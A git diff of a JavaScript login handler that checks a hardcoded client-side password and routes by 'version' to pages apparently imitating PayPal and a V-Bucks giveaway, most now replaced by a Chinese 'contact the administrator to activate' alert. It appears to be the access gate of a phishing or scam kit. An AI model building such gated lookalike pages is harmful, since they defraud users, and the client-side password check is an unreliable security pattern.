@@ -7,15 +7,19 @@ loginForm.addEventListener('submit', function (e) {
 
     if (password === '172839') {
         if (version === 'version1' || version === null) {
-            window.location.href = './pages/getcoins.html';
-        } else if (version === 'version2'){
             window.location.href = './pages/getcoins2.html';
+        } else if (version === 'version2'){
+          //  window.location.href = './pages/getcoins.html';
+            alert('网页未开通，请联系管理员开通网页！')
         } else if (version === 'vcoins'){
-            window.location.href = 'https://jongaha.github.io/vBucks/';
+           // window.location.href = 'https://jongaha.github.io/vBucks/';
+            alert('网页未开通，请联系管理员开通网页！')
         } else if (version === 'paypal'){
-            window.location.href = 'https://jongaha.github.io/Paypals/';
+           // window.location.href = 'https://jongaha.github.io/Paypals/';
+            alert('网页未开通，请联系管理员开通网页！')
         } else if (version === 'paypal_mobile'){
-            window.location.href = 'https://jongaha.github.io/paypal_m/';
+          //  window.location.href = 'https://jongaha.github.io/paypal_m/';
+            alert('网页未开通，请联系管理员开通网页！')
         }
     } else {
         alert('Wrong password. Please try again.');
